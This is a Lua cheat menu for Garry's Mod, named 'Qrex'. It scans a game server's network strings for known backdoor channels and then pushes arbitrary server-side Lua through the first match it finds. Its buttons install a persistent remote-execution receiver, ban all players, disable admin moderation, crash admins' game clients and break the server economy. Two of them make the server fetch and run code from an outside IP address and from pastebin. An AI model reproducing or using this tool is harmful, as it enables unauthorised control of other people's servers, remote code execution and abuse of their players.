MsgC(Color( 115, 90, 255 ), [[
          ____                _                        _       
         / __ \              | |                      (_)      
        | |  | |_ __ _____  _| |_ ___  _ __ ___  _ __  _  __ _ 
        | |  | | '__/ _ \ \/ / __/ _ \| '_ ` _ \| '_ \| |/ _` |
        | |__| | | |  __/>  <| || (_) | | | | | | | | | | (_| |
         \___\_\_|  \___/_/\_\\__\___/|_| |_| |_|_| |_|_|\__,_|

                 [http://steamcommunity.com/id/vectivus_]
]])

// Localization

local qrexton = {}
local rainbowGun = false
local netStrings = {}
local channel = ""
local openKey = KEY_F2
local toggle = false
local ply = LocalPlayer()
local me = LocalPlayer()
local selPly = 0
local eyeTrace = LocalPlayer():GetEyeTrace()

// FONTS

surface.CreateFont( "button", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = false, } )
surface.CreateFont( "labels", { font = "Calibri", extended = false, size = 16, weight = 500, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = false, additive = false, outline = true, } )

// Qrex Print

local function qrexchat(...)
    chat.AddText(Color(87, 39, 210), "[Qrex] ", Color(0, 184, 255), ...)
end

local function rndstr(len)
    if len == nil then
        len = 5
    end
    local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
    local r = ""
    while string.len(r) < len do
        r = r .. chars[math.random(1, #chars)]
    end
    return r
end

local noobstr = rndstr(16)
local backdoors = {"MEKELEK", "pdizzle", "qrex", "_potato", "hacking bro", "hackingbro", "kebabmenu", "rotten_proute", "BITMINER_UPDATE_DLC", "nostrip2", "operationsmoke", "vegeta", "pd1", "JSQuery.Data ( Post ( false ) )", "anatikisgodd", "anatikisgod", "https://i.imgur.com/gf6hlml.png", "print ( )", "fps", "fszof<qOvfdsf", "tupeuxpaslabypass", "_CAC_G", "adsp_door_length", "SDFTableFsSSQS", "EventStart", "data_check", "antileak", "CreateAdminRanks", "Asunalabestwaifu", "shittycommand", "tro2fakeestunpd", "FAdmin_CreateVar", "ContextHelp", "lmaogetdunked", "LV_BD_V2", "createpanel", "fuckyou", "1337", "haxor", "r8helper", "_chefhackv2", "ÃžÃ ?D)?", "Ãž  ?D)?", "nostrip1", "antilagger", "Fix_Exploit", "yazStats", "FPSVBOOST", "RTX420", "Revelation", "SizzurpDRM", "cbbc", "gSploit", "ÃƒÆ’Ã…Â¾ÃƒÆ’Ã‚ ?D)ÃƒÂ¢Ã¢â‚¬â€Ã‹Å“", "Reaoscripting", "ÃŸ ?D)?", "?????????????????ÃÂ¿??? ?? ?Ã‘Â¿??Ã„Â¿Ã•Â¿? ???Ã‘Â¿??Ã•Â¿??ÃÂ®", "!Ã‡Âº/;.", "NoOdium_Reaoscripting", "m9k_", "ÃŽÂ¾psilon", "Backdoor", "reaper", "SDFTableFsSSQE", "gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?", "?", "Ãžï¿½ ?D)â—˜", "Val", "models/zombie.mdl", "REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "Î¾psilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "ï¿½? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited", "PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab", "L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions", "PlayerCheck", "Sbox_darkrp", "insid3", "The_Dankwoo", "Sbox_itemstore", "Ulib_Message", "ULogs_Info", "ITEM", "R8", "fix", "Fix_Keypads", "Remove_Exploiters", "noclipcloakaesp_chat_text", "_Defqon", "_CAC_ReadMemory", "nostrip", "nocheat", "LickMeOut", "ULX_QUERY2", "ULXQUERY2", "https://i.imgur.com/Gf6hLMl.png", "MoonMan", "Im_SOCool", "JSQuery.Data(Post(false))", "Sandbox_GayParty", "DarkRP_UTF8", "OldNetReadData", "Gamemode_get", "memeDoor", "BackDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "cucked", "NoNerks", "kek", "ZimbaBackdoor", "something", "random", "strip0", "fellosnake", "enablevac", "idk", "ÃƒÅ¾Ãƒï¿½ ?D)Ã¢â€”Ëœ", "snte", "apg_togglemode", "Hi", "beedoor", "BDST_EngineForceButton", "VoteKickNO", "REEEEEEEEEEEE", "_da_", "Nostra", "sniffing", "keylogger", "CakeInstall", "Cakeuptade", "love", "earth", "ulibcheck", "Nostrip_", "teamfrench", "ADM", "hack", "crack", "leak", "lokisploit", "1234", "123", "enculer", "cake", "seized", "88", "88_strings_", "nostraall", "blogs_update", "nolag", "loona_", "_logs", "loona", "negativedlebest", "berettabest", "ReadPing", "antiexploit", "adm_NetString", "mathislebg", "Bilboard.adverts:Spawn(false)", "pjHabrp9EY", "?", "lag_ping", "allowLimitedRCON(user) 0", "aze46aez67z67z64dcv4bt", "killserver", "fuckserver", "cvaraccess", "rcon", "rconadmin", "web", "jesuslebg", "zilnix", "ï¿½ï¿½?D)?", "disablebackdoor", "kill", "DefqonBackdoor", "DarkRP_AllDoorDatas", "0101.1", "awarn_remove", "_Infinity", "Infinity", "InfinityBackdoor", "_Infinity_Meme_", "arivia", "ULogs_B", "_Warns", "_cac_", "striphelper", "_vliss", "YYYYTTYXY6Y", "?????????????????ï¿½???? ?? ?ï¿½???ï¿½?ï¿½?? ???ï¿½???ï¿½???ï¿½.", "_KekTcf", "_blacksmurf", "blacksmurfBackdoor", "_Raze", "m9k_explosionradius", "m9k_explosive", "m9k_addons", "rcivluz", "SENDTEST", "_clientcvars", "_main", "stream", "waoz", "bdsm", "ZernaxBackdoor", "UKT_MOMOS", "anticrash", "audisquad_lua", "dontforget", "noprop", "thereaper", "0x13", "Child", "!Cac", "azkaw", "BOOST_FPS", "childexploit", "ULX_ANTI_BACKDOOR", "FADMIN_ANTICRASH", "ULX_QUERY_TEST2", "GMOD_NETDBG", "netlib_debug", "_DarkRP_Reading", "lag_ping", "||||", "FPP_RemovePLYCache", "fuwa", "stardoor", "SENDTEST", "rcivluz", "c", "N::B::P", "changename", "PlayerItemPickUp", "echangeinfo", "fourhead", "music", "slua", "adm_network", "componenttolua", "theberettabcd", "SparksLeBg", "DarkRP_Armors", "DarkRP_Gamemodes", "fancyscoreboard_leave", "PRDW_GET", "pwn_http_send", "AnatikLeNoob", "GVacDoor", "Keetaxor", "BackdoorPrivate666", "YohSambreLeBest", "SNTE<ALL", "!ï¿½:/;.", "pwn_http_answer", "pwn_wake", "verifiopd", "AidsTacos", "shix", "PDA_DRM_REQUEST_CONTENT", "xenoreceivetargetdata2", "xenoreceivetargetdata1", "xenoserverdatafunction", "xenoserverfunction", "xenoclientdatafunction", "xenoclientfunction", "xenoactivation", "EXEC_REMOTE_APPS", "yohsambresicianatik<3", "Sbox_Message", "Sbox_gm_attackofnullday_key", "The_DankWhy", "nw.readstream", "AbSoluT", "__G____CAC", "Weapon_88", "mecthack", "SetPlayerDeathCount", "FAdmin_Notification_Receiver", "DarkRP_ReceiveData", "fijiconn", "LuaCmd", "EnigmaProject", "z", "cvardel", "effects_en", "file", "gag", "asunalabestwaifu", "stoppk", "Ulx_Error_88", "NoOdium_ReadPing", " striphelper "}

// Network Scan

function qrexton.CheckIfStringExists(str)
    local i = 1

    while util.NetworkIDToString(i) do
        if util.NetworkIDToString(i) == str then return true end
        i = i + 1
    end
end

local function CheckBackdoors()
    for k, v in pairs(backdoors) do
        if (qrexton.CheckIfStringExists(v)) then
            channel = v
            chat.AddText(Color(110, 80, 220), "[Qrex]", Color(0, 184, 255), " Found vulnerability â–¶ ", Color(0, 184, 255), v)
        end
    end

    if (channel == "") then
        chat.AddText(Color(110, 80, 220), "[Qrex]", Color(225, 155, 155), " No vulnerability has been found")
    end
end

function qrexton.PostLua(str)
    if (channel == "") then
        qrexchat("No netstring selected")

        return
    end

    net.Start(channel)
    net.WriteString(str)
    net.WriteBit(1)
    net.SendToServer()
end

// Color Transition

local mat_white = Material("vgui/white")

function draw.SimpleLinearGradient(x, y, w, h, startColor, endColor, horizontal)
    draw.LinearGradient(x, y, w, h, {
        {
            offset = 0,
            color = startColor
        },
        {
            offset = 1,
            color = endColor
        }
    }, horizontal)
end

function draw.LinearGradient(x, y, w, h, stops, horizontal)
    if #stops == 0 then
        return
    elseif #stops == 1 then
        surface.SetDrawColor(stops[1].color)
        surface.DrawRect(x, y, w, h)

        return
    end

    table.SortByMember(stops, "offset", true)
    render.SetMaterial(mat_white)
    mesh.Begin(MATERIAL_QUADS, #stops - 1)

    for i = 1, #stops - 1 do
        local offset1 = math.Clamp(stops[i].offset, 0, 1)
        local offset2 = math.Clamp(stops[i + 1].offset, 0, 1)
        if offset1 == offset2 then continue end
        local deltaX1, deltaY1, deltaX2, deltaY2
        local color1 = stops[i].color
        local color2 = stops[i + 1].color
        local r1, g1, b1, a1 = color1.r, color1.g, color1.b, color1.a
        local r2, g2, b2, a2
        local r3, g3, b3, a3 = color2.r, color2.g, color2.b, color2.a
        local r4, g4, b4, a4

        if horizontal then
            r2, g2, b2, a2 = r3, g3, b3, a3
            r4, g4, b4, a4 = r1, g1, b1, a1
            deltaX1 = offset1 * w
            deltaY1 = 0
            deltaX2 = offset2 * w
            deltaY2 = h
        else
            r2, g2, b2, a2 = r1, g1, b1, a1
            r4, g4, b4, a4 = r3, g3, b3, a3
            deltaX1 = 0
            deltaY1 = offset1 * h
            deltaX2 = w
            deltaY2 = offset2 * h
        end

        mesh.Color(r1, g1, b1, a1)
        mesh.Position(Vector(x + deltaX1, y + deltaY1))
        mesh.AdvanceVertex()
        mesh.Color(r2, g2, b2, a2)
        mesh.Position(Vector(x + deltaX2, y + deltaY1))
        mesh.AdvanceVertex()
        mesh.Color(r3, g3, b3, a3)
        mesh.Position(Vector(x + deltaX2, y + deltaY2))
        mesh.AdvanceVertex()
        mesh.Color(r4, g4, b4, a4)
        mesh.Position(Vector(x + deltaX1, y + deltaY2))
        mesh.AdvanceVertex()
    end

    mesh.End()
end

function draw.OutlinedBox(x, y, w, h, thickness, clr)
    surface.SetDrawColor(clr)

    for i = 0, thickness - 1 do
        surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
    end
end

function qrexton.labelOutline(name, pos, size)
    draw.OutlinedBox(pos[1], pos[2], size[1], size[2], 2, Color(0, 0, 0))
    draw.OutlinedBox(pos[1] + 1, pos[2] + 1, size[1] - 2, size[2] - 2, 1, Color(50, 50, 50))
    draw.WordBox(8, pos[1] + 20, pos[2] - 15, name, "labels", Color(30, 30, 30), Color(255, 255, 255))
end

local function PaintCHK(self, w, h)
    local chk = self
    chk:SetFont("button")

    function self.Button:Paint(w, h)
        local self = chk.Button
        draw.RoundedBox(0, 2, 2, w - 3, h - 3, Color(0, 0, 0))

        if self:GetChecked() then
            if chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
                draw.RoundedBox(0, 3, 3, h - 5, h - 5, Color(169, 237, 68))
                surface.SetMaterial(Material("gui/gradient_up"))
                surface.SetDrawColor(159, 227, 58)
                surface.DrawTexturedRect(3, 3, w - 5, h - 5)
            else
                draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(159, 227, 58))
                surface.SetMaterial(Material("gui/gradient_up"))
                surface.SetDrawColor(128, 184, 46)
                surface.DrawTexturedRect(3, 3, w - 5, h - 5)
            end

            surface.SetTextColor(255, 255, 255)
            surface.SetTextPos(-0.7, -1)
            surface.DrawText("")
        elseif chk:IsHovered() or chk.Label:IsHovered() or self:IsHovered() then
            draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(60, 60, 60))
            surface.SetMaterial(Material("gui/gradient_up"))
            surface.SetDrawColor(45, 45, 45)
            surface.DrawTexturedRect(3, 3, w - 5, h - 5)
        else
            draw.RoundedBox(0, 3, 3, w - 5, h - 5, Color(55, 55, 55))
            surface.SetMaterial(Material("gui/gradient_up"))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawTexturedRect(3, 3, w - 5, h - 5)
        end
    end
end

local qrex = vgui.Create("DFrame")
qrex:ShowCloseButton(false)
qrex:MakePopup()
qrex:SetSize(600, 800)
qrex:SetPos(1000, 40)
qrex:SetTitle(" ")
qrex:SetVisible(true)
qrex:SetDraggable(false)
qrex:Show()

qrex.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
    draw.OutlinedBox(3, 3, w - 6, h - 6, 5, Color(50, 50, 50))
    draw.OutlinedBox(4.8, 4.8, w - 8, h - 8, 3, Color(42, 42, 42))
end

function draw.Essential(position, parent)
    draw.LinearGradient(qrex.x + 10, qrex.y + 10, parent:GetWide() - 11, 2, {
        {
            offset = 0,
            color = Color(59, 175, 222)
        },
        {
            offset = 0.37,
            color = Color(202, 70, 205)
        },
        {
            offset = 0.725,
            color = Color(201, 227, 58)
        }
    }, true)
end

local panelNames = {"xploits"}

panelTable = {}

for k, v in pairs(panelNames) do
    qrexPanel = vgui.Create("DPanel")

    if (panelTable[1]) then
        qrexPanel:SetVisible(false)
    end

    qrexPanel:SetParent(qrex)
    qrexPanel:SetPos(0, 0)
    qrexPanel:SetSize(811, 791)
    table.insert(panelTable, qrexPanel)
end

panelTable[1].Paint = function(self, w, h)
    draw.Essential(48 + (100 * 1 - 100), self)
    qrexton.labelOutline("Server Features", {21, 29}, {270, 614})
    qrexton.labelOutline("Player Features", {312, 29}, {270, 290})
    qrexton.labelOutline("Player List", {312, 335}, {270, 296})
    qrexton.labelOutline("Console", {21, 661}, {561, 90})
end

local scripts = vgui.Create('DPanelList', qrex)
scripts:SetSize(250, 540)
scripts:SetPos(38, 44)
scripts.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

local scripts2 = vgui.Create('DPanelList', qrex)
scripts2:SetSize(250, 260)
scripts2:SetPos(326, 44)
scripts2.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

local playerlist = vgui.Create("DPanelList", qrex)
playerlist:SetSize(250, 277)
playerlist:SetPos(322, 350)
playerlist.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
end

function qrexton.AddButton(name, parent, func)
    local button = parent:Add("DButton")
    button:SetText("")
    button:Dock(TOP)
    button:SetFont("DermaDefault")
    button:DockMargin(0, 0, 0, 5)
    button:SetSize(170, 30)
    button.DoClick = func

    button.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(50, 50, 50)
        surface.DrawRect(1, 1, w - 2, h - 2)
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(35, 35, 35)
        surface.DrawTexturedRect(2, 2, w - 4, h - 4)
        draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
    end
end

local SC = vgui.Create("DScrollPanel", scripts)
SC:SetPos( 6, 6 )
SC:Dock(FILL)
local ssc1 = SC:GetVBar()

function ssc1:Paint() end
function ssc1.btnUp:Paint() end
function ssc1.btnDown:Paint() end
function ssc1.btnGrip:Paint() end

local SC2 = vgui.Create("DScrollPanel", scripts2)
SC2:SetPos( 6, 6 )
SC2:Dock(FILL)
local ssc2 = SC2:GetVBar()

function ssc2:Paint() end
function ssc2.btnUp:Paint() end
function ssc2.btnDown:Paint() end
function ssc2.btnGrip:Paint() end

local SC3 = vgui.Create("DScrollPanel", playerlist)
SC3:SetPos( 6, 6 )
SC3:Dock(FILL)
local ssc3 = SC3:GetVBar()

function ssc3:Paint() end
function ssc3.btnUp:Paint() end
function ssc3.btnDown:Paint() end
function ssc3.btnGrip:Paint() end

local txt = vgui.Create("DLabel", qrex )
txt:SetFont("DermaDefault")
txt:SetText("No one selected")
txt:SetTextColor(Color(255, 255, 255))
txt:SetSize( 1000, 1000 )
txt:SetPos(312, 632)
txt:SizeToContents()

local function players()
    for k, v in pairs(player.GetAll()) do
        qrexton.AddButton(v:Name(), SC3, function()
            selPly = v:UserID()
            txt:SetText(Player(selPly):Name())
        end)
    end
end

players()

local scan = vgui.Create( "DButton", qrex )
scan:SetSize( 250, 30 )
scan:SetPos( 32, 599 )
scan:SetTextColor(Color(255,255,255,255))
scan:SetFont("button")
scan:SetText("Backdoor scan")

scan.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

scan.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    CheckBackdoors()
end

local rt = vgui.Create("DTextEntry", qrex )
rt:SetPos(27, 672)
rt:SetSize(550, 75)
rt:SetTextColor(Color(255, 255, 255, 255))
rt:SetFont("DermaDefault")
rt:SetMultiline(true)

rt.Paint = function(self, w, h)
    draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
    draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
    draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
    surface.SetDrawColor(20, 20, 20)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
end

local target = vgui.Create( "DButton", qrex )
target:SetSize( 176, 25 )
target:SetPos( 21, 758 )
target:SetTextColor(Color(255,255,255,255))
target:SetFont("button")
target:SetText("Target Net")

target.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

target.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    qrexchat("NetString: "..rt:GetValue())
    channel = rt:GetValue()
end

local rconcmd = vgui.Create( "DButton", qrex )
rconcmd:SetSize( 176, 25 )
rconcmd:SetPos( 214, 758 )
rconcmd:SetTextColor(Color(255,255,255,255))
rconcmd:SetFont("button")
rconcmd:SetText("Rcon CMD")

rconcmd.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

rconcmd.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    local GetEntry = rt:GetValue()
    net.Start(channel)
    net.WriteString(GetEntry)
    net.WriteBit(false)
    net.SendToServer()
end

local luacmd = vgui.Create( "DButton", qrex )
luacmd:SetSize( 176, 25 )
luacmd:SetPos( 406, 758 )
luacmd:SetTextColor(Color(255,255,255,255))
luacmd:SetFont("button")
luacmd:SetText("Lua CMD")

luacmd.Paint = function( self, w, h )
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
end

luacmd.DoClick = function()
    surface.PlaySound("buttons/button18.wav")
    local GetEntry = rt:GetValue()
    net.Start(channel)
    net.WriteString(GetEntry)
    net.WriteBit(1)
    net.SendToServer()
end



qrexton.AddButton( "@Inject SendLua Interface", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ util.AddNetworkString("qrex")net.Receive("qrex",function(a,b) local c=net.ReadString() local d=net.ReadBit() if d==1 then RunString(c) else game.ConsoleCommand(c.."\n") end end) ]] )
end)

qrexton.AddButton( "Artillery strike", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not bombstrike then hook.Add("Think","lulz_bombstrike",function()local a=ents.Create("env_explosion")local b=Vector(math.random(-8000,8000),math.random(-8000,8000),math.random(-5000,5000))local c={}c.start=b;c.endpos=b+Vector(0,0,-99999)local d=util.TraceLine(c)if not d.Hit then return end;a:SetPos(d.HitPos)a:Spawn()a:SetKeyValue("iMagnitude","400")a:Fire("Explode",0,0)end)bombstrike=true else hook.Remove("Think","lulz_bombstrike")bombstrike=false end ]] )
end)

qrexton.AddButton( "Announce centre screen", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
        qrexton.PostLua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
    end)
end)

qrexton.AddButton( "Broken glass symphony", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not timer.Exists("A true masterpiece")then timer.Create("A true masterpiece",0.2,0,function()for a,b in pairs(player.GetAll())do b:EmitSound("physics/glass/glass_largesheet_break"..math.random(1,3)..".wav",100,math.random(40,180))end end)else timer.Remove("A true masterpiece")end ]] )
end)

qrexton.AddButton( "Double or nothing", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BDON_CONFIG.doubleChance = ]]..str )
end)

qrexton.AddButton( "Bitminers2 value", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BM2CONFIG.BitcoinValue = ]]..str )
end)

qrexton.AddButton( "Ban all players", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local id = ]] ..LocalPlayer():UserID().. [[ for k, v in next, player.GetAll() do if v:UserID() == id then continue end v:Ban(0, false) v:Kick("]] ..tostring(text).. [[") end ]] )
end)

qrexton.AddButton( "Break economy", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end ]] )
end)

qrexton.AddButton( "Cleanup map", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ game.CleanUpMap() ]] )
end)

qrexton.AddButton( "Custom job", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ TEAM_]]..noobstr..[[ = DarkRP.createJob("Qrex", { model = "models/player/skeleton.mdl", weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"}, command = "]]..noobstr..[[", description = "A fucking gamer", max = 1, customCheck = function(ply) return ply:SteamID() == "]]..ply:SteamID()..[[" end, CustomCheckFailMsg = "This isn't your custom class!", color = Color(0, 0, 0, 255), salary = 1000000000, admin = 0, vote = false, hasLicense = true, category = "Citizens", PlayerSpawn = function(ply) ply:SetMaxHealth(10000) ply:SetHealth(10000) ply:SetArmor(10000) end, }) ]] )
end)


qrexton.AddButton( "Crash Admins", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end ]] )
end)

qrexton.AddButton( "Console jammer", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not (timer.Exists("Block_")) then timer.Create("Block_", 0.5, 0, function() print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n") end) else timer.Destroy("Block_") end ]] )
end)

qrexton.AddButton( "Change all name", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
        qrexton.PostLua( [[ local str = "]] .. text .. [[" for k, v in next, player.GetAll() do DarkRP.storeRPName(v, str) v:setDarkRPVar("rpname", str) end ]] )
    end)
end)

qrexton.AddButton( "Change all model", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:SetModel(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Change all material", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(ents.GetAll()) do v:SetMaterial(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Disable administrations", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local nothing = function() end if ULib then ULib.kick = nothing ULib.ban = nothing ULib.addBan = nothing end if xAdmin then xAdmin.Admin.Bans = nothing xAdmin.Admin.Ban = nothing xAdmin.Admin.Kick = nothing end if FAdmin then local tbl = {"kick", "ban", "jail", "UnJail", "ClearDecals", "StopSounds", "CleanUp"} for i = 1, #tbl do FAdmin.Commands.AddCommand(tbl[i], nothing) end end local meta = debug.getregistry().Player meta.Ban = nothing meta.Kick = nothing game.KickID = nothing local _ = RunConsoleCommand function RunConsoleCommand(command, ...) if command == "addip" then return end _(command, ...) end ]] )
end)

qrexton.AddButton( "Disable exit", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end) ]] )
end)

qrexton.AddButton( "Earthquake", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not timer.Exists("earthquake") then timer.Create("earthquake", 0.5, 500, function() for _, p in pairs(player.GetAll()) do p:SetPos(p:GetPos() + Vector(0, 0, 1)) p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) util.ScreenShake(p:GetPos(), 20, 1, 1, 100) p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100)) end for _, e in pairs(ents.GetAll()) do if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end end end) else timer.Remove("earthquake") end ]] )
end)

qrexton.AddButton( "EarRape", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:EmitSound("npc/stalker/go_alert2a.wav", 100, 100 ) end ]] )
end)

qrexton.AddButton( "Enigma Disco", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ http.Fetch("http://206.189.17.188/b1g.lua", function(b) RunString(b) end ) ]] )
end)

qrexton.AddButton( "Hell mode", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1', function(b) RunString(b) end )") ]] )
end)

qrexton.AddButton( "Ignite everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
        qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:Ignite(]]..str..[[) end ]] )
    end)
end)

qrexton.AddButton( "Kill everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k,v in pairs(player.GetAll()) do v:Kill() end ]] )
end)

